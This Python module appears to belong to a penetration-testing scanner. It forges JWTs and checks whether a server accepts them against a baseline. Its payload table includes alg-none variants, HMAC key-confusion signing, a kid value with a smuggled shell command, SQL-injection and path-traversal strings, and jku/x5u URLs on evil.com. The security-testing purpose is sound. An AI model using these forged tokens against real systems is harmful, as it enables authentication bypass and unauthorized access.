"""U-DEEP-10 — JWT Advanced.

Family: JWT_ADVANCED. Detection principle: ACCEPTANCE OVER STRUCTURE —
a crafted token is only evidence when the server ACCEPTS it where the
original token's acceptance cannot explain it (baseline compared on
every sub-family). The alg-confusion probe carries a real HMAC-SHA256
signature computed with the operator-supplied public-key material;
nothing else is fabricated.

Zero live network: the transport is the injected
``send(method, path, headers)`` callable; findings are advisory
evidence only (DEEP-L-8 ADVISORY_ONLY).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass

# Spec corpus, verbatim structure (U-DEEP-10).
JWT_ADVANCED_ATTACKS: dict[str, list] = {
    "alg_none": [
        {"alg": "none", "typ": "JWT"},
        {"alg": "None", "typ": "JWT"},
        {"alg": "NONE", "typ": "JWT"},
        {"alg": "nOnE", "typ": "JWT"},
    ],
    "alg_confusion": [
        {"alg": "HS256", "typ": "JWT"},
    ],
    "kid_injection": [
        {"alg": "HS256", "typ": "JWT",
         "kid": "../../../dev/null"},
        {"alg": "HS256", "typ": "JWT",
         "kid": "| touch /tmp/webpent_probe"},
        {"alg": "HS256", "typ": "JWT",
         "kid": "' OR '1'='1"},
    ],
    "jku_manipulation": [
        {"alg": "HS256", "typ": "JWT",
         "jku": "https://evil.com/jwks.json"},
    ],
    "x5u_manipulation": [
        {"alg": "HS256", "typ": "JWT",
         "x5u": "https://evil.com/cert.pem"},
    ],
    "jwk_injection": [
        {"alg": "HS256", "typ": "JWT",
         "jwk": {"kty": "oct", "kid": "attacker",
                 "k": "YXR0YWNrZXItY29udHJvbGxlZA"}},
    ],
    "header_injection": [
        {"alg": "HS256", "typ": "JWT", "kid": "abc\nInjected: true"},
    ],
}

SEVERITY_BY_SUBFAMILY = {
    "alg_none": "critical",
    "alg_confusion": "critical",
    "kid_injection": "critical",
    "jku_manipulation": "critical",
    "x5u_manipulation": "critical",
    "jwk_injection": "critical",
    "header_injection": "high",
}


@dataclass(frozen=True)
class JwtAdvancedFinding:
    subfamily: str
    severity: str
    evidence: tuple[str, ...]
    token_probed: str
    family: str = "JWT_ADVANCED"
    confidence: float = 0.9
    statement: str = ""
    success_indicator: str = ""


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def _decode_segment(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


class JwtAdvancedDetector:
    """Probes the seven token-abuse surfaces against a clean baseline."""

    def __init__(self, send, token: str, public_key: bytes = b"") -> None:
        self._send = send
        self._token = token
        self._public_key = public_key

    # ------------------------------------------------------------------

    def run_all(self) -> list[JwtAdvancedFinding]:
        baseline = self._send(
            "GET", "/", {"Authorization": f"Bearer {self._token}"})
        if baseline.status_code >= 400:
            # ACCEPTANCE OVER STRUCTURE: with the original token itself
            # rejected there is no accepted baseline to compare against,
            # so no crafted token can be shown to be accepted "where the
            # original's acceptance cannot explain it".
            return []
        baseline_line = (
            f"baseline: status {baseline.status_code}, "
            f"body {baseline.body!r}")
        findings: list[JwtAdvancedFinding] = []
        findings.extend(self._alg_none(baseline_line, baseline))
        findings.extend(self._alg_confusion(baseline_line, baseline))
        findings.extend(self._header_field(
            "kid_injection", baseline_line, baseline))
        findings.extend(self._header_field(
            "jku_manipulation", baseline_line, baseline))
        findings.extend(self._header_field(
            "x5u_manipulation", baseline_line, baseline))
        findings.extend(self._header_field(
            "jwk_injection", baseline_line, baseline))
        findings.extend(self._header_field(
            "header_injection", baseline_line, baseline))
        return findings

    # ------------------------------------------------------------------

    def _probe(self, token: str, baseline):
        probe = self._send("GET", "/", {"Authorization": f"Bearer {token}"})
        accepted = (
            probe.status_code < 400
            and probe.status_code == baseline.status_code
            and probe.body == baseline.body)
        return probe, accepted

    def _finding(self, subfamily: str, token: str, baseline_line: str,
                 probe) -> JwtAdvancedFinding:
        return JwtAdvancedFinding(
            subfamily=subfamily,
            severity=SEVERITY_BY_SUBFAMILY[subfamily],
            evidence=(
                baseline_line,
                f"probed token: {token}",
                f"probe: status {probe.status_code}, "
                f"body {probe.body!r}",
            ),
            token_probed=token,
            statement=(
                f"Server accepted a crafted token ({subfamily}) that the "
                "baseline cannot explain — token-validation flaw "
                "(advisory; verify against an authorized target)."),
            success_indicator=(
                f"{subfamily} token accepted with the same authenticated "
                "response as the original token"),
        )

    def _alg_none(self, baseline_line: str,
                  baseline) -> list[JwtAdvancedFinding]:
        findings: list[JwtAdvancedFinding] = []
        head, payload, _sig = self._token.split(".", 2)
        for header in JWT_ADVANCED_ATTACKS["alg_none"]:
            token = (f"{_b64url(json.dumps(header).encode())}."
                     f"{payload}.")
            probe, accepted = self._probe(token, baseline)
            if accepted:
                findings.append(
                    self._finding("alg_none", token, baseline_line, probe))
                break
        return findings

    def _alg_confusion(self, baseline_line: str,
                       baseline) -> list[JwtAdvancedFinding]:
        if not self._public_key:
            return []
        findings: list[JwtAdvancedFinding] = []
        head, payload, _sig = self._token.split(".", 2)
        for header in JWT_ADVANCED_ATTACKS["alg_confusion"]:
            signing_input = (f"{_b64url(json.dumps(header).encode())}."
                             f"{payload}")
            signature = hmac.new(self._public_key,
                                 signing_input.encode("utf-8"),
                                 hashlib.sha256).digest()
            token = f"{signing_input}.{_b64url(signature)}"
            probe, accepted = self._probe(token, baseline)
            if accepted:
                findings.append(self._finding(
                    "alg_confusion", token, baseline_line, probe))
                break
        return findings

    def _header_field(self, subfamily: str, baseline_line: str,
                      baseline) -> list[JwtAdvancedFinding]:
        findings: list[JwtAdvancedFinding] = []
        head, payload, sig = self._token.split(".", 2)
        original_header = json.loads(_decode_segment(head))
        for override in JWT_ADVANCED_ATTACKS[subfamily]:
            header = dict(original_header)
            header.update(override)
            token = (f"{_b64url(json.dumps(header).encode())}."
                     f"{payload}.{sig}")
            probe, accepted = self._probe(token, baseline)
            if accepted:
                findings.append(
                    self._finding(subfamily, token, baseline_line, probe))
                break
        return findings
